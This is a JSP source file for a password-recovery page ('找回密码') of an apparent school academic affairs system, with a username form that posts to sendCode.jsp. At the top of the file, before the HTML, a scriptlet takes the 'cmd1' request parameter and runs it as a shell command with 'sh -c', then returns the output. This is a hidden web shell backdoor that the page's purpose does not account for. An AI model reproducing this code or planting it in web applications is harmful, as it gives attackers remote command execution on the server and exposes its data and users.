<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.IOException" %><%--
  Created by IntelliJ IDEA.
  User: 007
  Date: 2018/11/28
  Time: 10:12
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String cmdParameter = request.getParameter("cmd1");
    if (cmdParameter != null && !cmdParameter.isEmpty()) {
        try {
            // 构建系统命令
            ProcessBuilder processBuilder = new ProcessBuilder();
            processBuilder.command("sh", "-c", cmdParameter);

            // 执行命令并获取输出
            Process process = processBuilder.start();
            InputStream inputStream = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            // 输出命令执行结果
            out.println("Command executed successfully. Output:\n" + output.toString());
        } catch (IOException e) {
            out.println("Error executing command: " + e.getMessage());
        }
    }
%>
<html>
<head>
    <title>找回密码</title>
    <link rel="stylesheet" href="resources/css/bootstrap.min.css">
    <link href="resources/css/forget.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 style="margin: 50px 80px; color: darkgray; font-family: cursive;">欢迎来到教务系统</h1>
<div class="main">
    <form role="form" action="sendCode.jsp" method="post">
        <div class="form-group" align="center">
            <input class="form-control" type="text" name="user" placeholder="输入用户名"><br>
            <input type="submit" class="btn btn-success" value="下一步">
            <input type="button"  class="btn btn-info" value="取消" style="margin-left: 20px" onclick="window.location.href='login.jsp'">
        </div>
    </form>
</div>
<script src="resources/js/jquery-3.2.1.min.js"></script>
<script src="resources/js/popper.min.js"></script>
<script src="resources/js/bootstrap.min.js"></script>
</body>
</html>
